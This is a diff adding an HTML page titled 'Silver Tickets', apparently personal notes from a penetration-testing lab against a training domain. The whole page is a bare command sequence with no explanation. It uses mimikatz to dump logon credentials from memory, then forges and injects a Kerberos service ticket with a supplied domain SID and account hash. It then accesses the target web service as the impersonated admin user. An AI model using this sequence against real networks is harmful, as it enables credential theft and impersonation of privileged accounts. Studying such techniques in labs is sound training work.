@@ -1,0 +1,24 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Silver Tickets</title>
+</head><body>iwr -UseDefaultCredentials http://web04<br/>
+<br/>
+.\mimikatz.exe<br/>
+<br/>
+privilege::debug<br/>
+<br/>
+sekurlsa::logonpasswords<br/>
+<br/>
+whoami /user<br/>
+<br/>
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin<br/>
+<br/>
+klist<br/>
+<br/>
+iwr -UseDefaultCredentials http://web04<br/>
+<br/>
+<span style="font-family: gg sans"><span style="font-size: 16pt"><div style="text-align: left">$output = iwr -UseDefaultCredentials </div></span></span><span style="font-size: 16pt"><span style="font-family: inherit"><a href="http://web04/">http://web04/</a></span></span>&nbsp; <br/>
+<br/>
+<div style="text-align: left"><span style="font-size: 16pt"><span style="font-family: gg sans">$output.content</span></span></div>&nbsp; </body></html>
